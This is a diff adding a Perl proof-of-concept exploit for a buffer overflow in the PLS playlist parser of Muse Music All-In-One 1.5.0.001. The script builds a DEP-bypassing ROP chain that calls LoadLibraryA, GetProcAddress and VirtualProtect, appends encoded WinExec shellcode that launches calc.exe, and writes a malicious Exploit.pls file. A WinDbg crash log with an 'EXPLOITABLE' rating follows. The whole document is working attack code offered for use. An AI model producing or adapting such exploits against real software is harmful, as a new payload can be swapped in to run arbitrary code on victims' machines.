@@ -1,0 +1,179 @@
+#!/usr/bin/perl
+#
+#[+]Exploit Title: Muse Music All-In-One PLS File Buffer Overflow Exploit(DEP Bypass)
+#[+]Date: 25\09\2011(DD\MM\YYYY)
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://download.cnet.com/Muse-Music-All-In-One/3000-2141_4-10070288.html
+#[+]Version: 1.5.0.001
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+#[+]Info:
+#This exploit can be universal, if the buffer to overwrite EIP stay for all Windows systems equal. ;)
+#To reproduce click in File -> Open... -> Select Exploit.pls and see the Calc. 
+#
+
+use strict;
+use warnings;
+
+print q{
+ 
+			Created By C4SS!0 G0M3S
+			E-mail netfuzzer@hotmail.com
+			Blog net-fuzzer.blogspot.com
+};
+print "\n\t\t[+]Creating Exploit File...\n";
+sleep(2);
+
+##########################ROP START HERE###############################################
+my $rop = pack('V',0x0043bc93); # POP EAX # RETN
+$rop .= "AAAA" x 4; # JUNK
+$rop .= pack('V',0x00339014); # PTR to a Call DWORD for LoadLibraryA 
+$rop .= pack('V',0x1002042f); # POP EBP # RETN
+$rop .= pack('V',0x0044387e); # ADD ESP,40 # RETN == Return of LoadLibraryA
+$rop .= pack('V',0x100255d1); # POP ESI # RETN
+$rop .= pack('V',0x003367C1); # JMP [EAX] // Jump to [DWORD EAX] == LoadLibraryA
+$rop .= pack('V',0x004a296b); # POP EDI # RETN
+$rop .= pack('V',0x004a296c); # RETN
+$rop .= pack('V',0x004b0519); # PUSHAD # RETN
+$rop .= "kernel32.dll\x00";
+$rop .= "A" x 35; # JUNK
+#############################Call GetProcAddress###################################
+$rop .= pack('V',0x004b2507); # XCHG EAX,EBX # RETN 
+$rop .= pack('V',0x004a296b); # POP EDI # RETN
+$rop .= pack('V',0x003367C1); # JMP [EAX] // Jump to [DWORD EAX] == GetProcAddress
+$rop .= pack('V',0x100255d1); # POP ESI # RETN
+$rop .= pack('V',0x0044387e); # ADD ESP,40 # RETN == Return of GetProcAddress
+$rop .= pack('V',0x004b2507); # XCHG EAX,EBX # RETN 
+$rop .= pack('V',0x004b9563); # XCHG EAX,EBP # RETN
+$rop .= pack('V',0x0043bc93); # POP EAX # RETN
+$rop .= pack('V',0x00339010); # PTR to GetProcAddress
+$rop .= pack('V',0x004a296b); # POP EDI # RETN
+$rop .= pack('V',0x003367C1); # JMP [EAX] // Jump to [DWORD EAX] == GetProcAddress
+$rop .= pack('V',0x004b0519); # PUSHAD # RETN
+$rop .= "VirtualProtect\x00";
+$rop .= "A" x 33; # JUNK
+#############################Call VirtualProtect####################################
+$rop .= pack('V',0x004b2507); # XCHG EAX,EBX # RETN
+$rop .= pack('V',0x00432a42); # PUSH ESP # POP EDI # XOR EAX,EAX # POP ESI # RETN 08
+$rop .= "VVVV"; # JUNK
+$rop .= pack('V',0x004a296c) x 3; # RETN
+$rop .= pack('V',0x10018000); # XOR EAX,EAX # RETN
+$rop .= pack('V',0x0043bc93); # POP EAX # RETN
+$rop .= pack('V',0x00000040); # Value of flNewProtect
+$rop .= pack('V',0x00478695); # XCHG EAX,EDX # RETN
+$rop .= pack('V',0x10018000); # XOR EAX,EAX # RETN
+$rop .= pack('V',0x1001433f); # ADD EAX,EDI # POP EDI # POP ESI # RETN
+$rop .= "A" x 8; # JUNK
+$rop .= pack('V',0x1002028b); # POP ECX # RETN
+$rop .= "\x00\x00\x00\x00";
+$rop .= pack('V',0x1000B6ED); # ADD ECX,EAX # MOV DWORD PTR DS:[10085B38],ECX # RETN
+$rop .= pack('V',0x004b2507); # XCHG EAX,EBX # RETN 
+$rop .= pack('V',0x1002042f); # POP EBP # RETN
+$rop .= pack('V',0x10012107); # PUSH ESP # RETN == Return of VirtualProtect
+$rop .= pack('V',0x004a05b8); # POP EBX # RETN
+$rop .= pack('V',0x00000500); # Value of dwSize
+$rop .= pack('V',0x004b2c56); # XCHG EAX,ESI # RETN
+$rop .= pack('V',0x004a296b); # POP EDI # RETN
+$rop .= pack('V',0x004a296c); # RETN
+$rop .= pack('V',0x004b0519); # PUSHAD # RETN
+##########################ROP END HERE#################################################
+my $shellcode = 
+"\xb8\x4b\xaf\x2d\x0e\xda\xde\xd9\x74\x24\xf4\x5b\x29\xc9" .
+"\xb1\x32\x83\xeb\xfc\x31\x43\x0e\x03\x08\xa1\xcf\xfb\x72" .
+"\x55\x86\x04\x8a\xa6\xf9\x8d\x6f\x97\x2b\xe9\xe4\x8a\xfb" .
+"\x79\xa8\x26\x77\x2f\x58\xbc\xf5\xf8\x6f\x75\xb3\xde\x5e" .
+"\x86\x75\xdf\x0c\x44\x17\xa3\x4e\x99\xf7\x9a\x81\xec\xf6" .
+"\xdb\xff\x1f\xaa\xb4\x74\x8d\x5b\xb0\xc8\x0e\x5d\x16\x47" .
+"\x2e\x25\x13\x97\xdb\x9f\x1a\xc7\x74\xab\x55\xff\xff\xf3" .
+"\x45\xfe\x2c\xe0\xba\x49\x58\xd3\x49\x48\x88\x2d\xb1\x7b" . # Shellcode Winexec "Calc.exe"
+"\xf4\xe2\x8c\xb4\xf9\xfb\xc9\x72\xe2\x89\x21\x81\x9f\x89" . # Bad chars "\x00\x20\x3d\x0a\x0d\xff"
+"\xf1\xf8\x7b\x1f\xe4\x5a\x0f\x87\xcc\x5b\xdc\x5e\x86\x57" .
+"\xa9\x15\xc0\x7b\x2c\xf9\x7a\x87\xa5\xfc\xac\x0e\xfd\xda" .
+"\x68\x4b\xa5\x43\x28\x31\x08\x7b\x2a\x9d\xf5\xd9\x20\x0f" .
+"\xe1\x58\x6b\x45\xf4\xe9\x11\x20\xf6\xf1\x19\x02\x9f\xc0" .
+"\x92\xcd\xd8\xdc\x70\xaa\x17\x97\xd9\x9a\xbf\x7e\x88\x9f" .
+"\xdd\x80\x66\xe3\xdb\x02\x83\x9b\x1f\x1a\xe6\x9e\x64\x9c" .
+"\x1a\xd2\xf5\x49\x1d\x41\xf5\x5b\x7e\x04\x65\x07\x81";
+my $buf = "A" x 1300;
+$buf .= $rop; 
+$buf .= "\x90" x 10;
+$buf .= $shellcode;
+$buf .= "A" x 2000;
+
+open(my $file,">Exploit.pls") or die "[-]Error: $!\n";
+print $file $buf;
+close $file;
+print "\t\t[+]File Exploit.pls Created Successfully.\n";
+sleep(1);
+=head
+(8f4.8f8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000041 ebx=0000007b ecx=ffffffff edx=00000002 esi=00130000 edi=77c3fce0
+eip=77c24609 esp=0012ea1c ebp=0012ec34 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\msvcrt.dll - 
+msvcrt!wscanf+0x2343:
+77c24609 8806            mov     byte ptr [esi],al          ds:0023:00130000=41
+0:000> .exr -1
+ExceptionAddress: 77c24609 (msvcrt!wscanf+0x00002343)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000001
+   Parameter[1]: 00130000
+Attempt to write to address 00130000
+0:000> .lastevent
+Last event: 8f4.8f8: Access violation - code c0000005 (first chance)
+  debugger time: Sun Sep 25 19:22:13.937 2011 (UTC - 3:00)
+0:000> k
+ChildEBP RetAddr  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0012ec34 77c212df msvcrt!wscanf+0x2343
+*** WARNING: Unable to verify checksum for Muse.exe
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for Muse.exe - 
+0012ec70 00498d3a msvcrt!fscanf+0x28
+0012eca4 7c91a3cb Muse!CSdll::operator=+0x974fa
+0012ecb8 7c91a351 ntdll!RtlpUnWaitCriticalSection+0x86c
+00000000 00000000 ntdll!RtlpUnWaitCriticalSection+0x7f2
+0:000> g
+(8f4.8f8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=41414141 edx=7c9032bc esi=00000000 edi=00000000
+eip=41414141 esp=0012e64c ebp=0012e66c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+41414141 ??              ???
+0:000> !load winext/msec.dll
+0:000> !exploitable -v
+HostMachine\HostUser
+Executing Processor Architecture is x86
+Debuggee is in User Mode
+Debuggee is a live user mode debugging session on the local machine
+Event Type: Exception
+Exception Faulting Address: 0x41414141
+First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
+Exception Sub-Type: Read Access Violation
+
+Exception Hash (Major/Minor): 0x71174239.0x2a6b1069
+
+Stack Trace:
+Unknown
+ntdll!RtlConvertUlongToLargeInteger+0x6a
+ntdll!RtlConvertUlongToLargeInteger+0x3c
+ntdll!KiUserExceptionDispatcher+0xe
+msvcrt!fscanf+0x28
+Muse!CSdll::operator=+0x974fa
+ntdll!RtlpUnWaitCriticalSection+0x86c
+ntdll!RtlpUnWaitCriticalSection+0x7f2
+Instruction Address: 0x0000000041414141
+
+Description: Read Access Violation at the Instruction Pointer
+Short Description: ReadAVonIP
+Exploitability Classification: EXPLOITABLE
+Recommended Bug Title: Exploitable - Read Access Violation at the Instruction Pointer starting at Unknown Symbol @ 0x0000000041414141 called from ntdll!RtlConvertUlongToLargeInteger+0x000000000000006a (Hash=0x71174239.0x2a6b1069)
+
+Access violations at the instruction pointer are exploitable if not near NULL.
+
+=cut
